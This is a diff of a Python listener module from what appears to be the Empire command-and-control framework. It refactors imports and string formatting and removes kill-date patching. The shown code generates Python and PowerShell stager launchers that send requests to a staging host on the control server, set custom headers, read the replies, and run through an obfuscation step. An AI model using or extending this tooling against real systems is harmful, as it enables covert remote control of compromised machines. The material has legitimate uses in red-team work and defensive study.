@@ -1,5 +1,3 @@
-from __future__ import print_function
-
 import base64
 import copy
 import logging
@@ -9,7 +7,6 @@ import ssl
 import sys
 import time
 import urllib.parse
-from builtins import object, str
 from typing import List, Optional, Tuple
 
 from flask import Flask, Response, make_response, request
@@ -26,8 +23,8 @@ LOG_NAME_PREFIX = __name__
 log = logging.getLogger(__name__)
 
 
-class Listener(object):
-    def __init__(self, mainMenu: MainMenu, params=[]):
+class Listener:
+    def __init__(self, mainMenu: MainMenu):
         self.info = {
             "Name": "HTTP[S] MALLEABLE",
             "Authors": [
@@ -65,7 +62,7 @@ class Listener(object):
             "Host": {
                 "Description": "Hostname/IP for staging.",
                 "Required": True,
-                "Value": "http://%s:%s" % (helpers.lhost(), 80),
+                "Value": f"http://{helpers.lhost()}:{80}",
             },
             "BindIP": {
                 "Description": "The IP to bind to on the control server.",
@@ -118,7 +115,7 @@ class Listener(object):
                 "Value": "default",
             },
             "ProxyCreds": {
-                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
+                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                 "Required": False,
                 "Value": "default",
             },
@@ -163,7 +160,7 @@ class Listener(object):
         """
         Returns an IIS 7.5 404 not found page.
         """
-        return open(f"{self.template_dir }/default.html", "r").read()
+        return open(f"{self.template_dir }/default.html").read()
 
     def validate_options(self) -> Tuple[bool, Optional[str]]:
         """
@@ -529,7 +526,7 @@ class Listener(object):
 
                 # ==== BUILD REQUEST ====
                 launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
-                launcherBase += "req=vreq('%s', %s)\n" % (
+                launcherBase += "req=vreq('{}', {})\n".format(
                     profile.stager.client.url,
                     profile.stager.client.body,
                 )
@@ -537,7 +534,7 @@ class Listener(object):
 
                 # ==== ADD HEADERS ====
                 for header, value in profile.stager.client.headers.items():
-                    launcherBase += "req.add_header('%s','%s')\n" % (header, value)
+                    launcherBase += f"req.add_header('{header}','{value}')\n"
 
                 # ==== SEND REQUEST ====
                 launcherBase += "res=urllib.request.urlopen(req)\n"
@@ -548,7 +545,7 @@ class Listener(object):
                     == malleable.Terminator.HEADER
                 ):
                     launcherBase += "head=res.info().dict\n"
-                    launcherBase += "a=head['%s'] if '%s' in head else ''\n" % (
+                    launcherBase += "a=head['{}'] if '{}' in head else ''\n".format(
                         profile.stager.server.output.terminator.arg,
                         profile.stager.server.output.terminator.arg,
                     )
@@ -793,11 +790,6 @@ class Listener(object):
                 f'$DefaultResponse = "{ b64DefaultResponse }"',
             )
 
-            # patch in the killDate and workingHours if they're specified
-            if killDate != "":
-                code = code.replace(
-                    "$KillDate,", "$KillDate = '" + str(killDate) + "',"
-                )
             if obfuscate:
                 code = self.mainMenu.obfuscationv2.obfuscate(
                     code,
@@ -886,7 +878,7 @@ $script:GetTask = {{
             $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
             $RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
             { profile.get.client.metadata.generate_powershell("$RoutingPacket") }
-            
+
             # ==== BUILD REQUEST ====
             $vWc = New-Object System.Net.WebClient;
             $vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
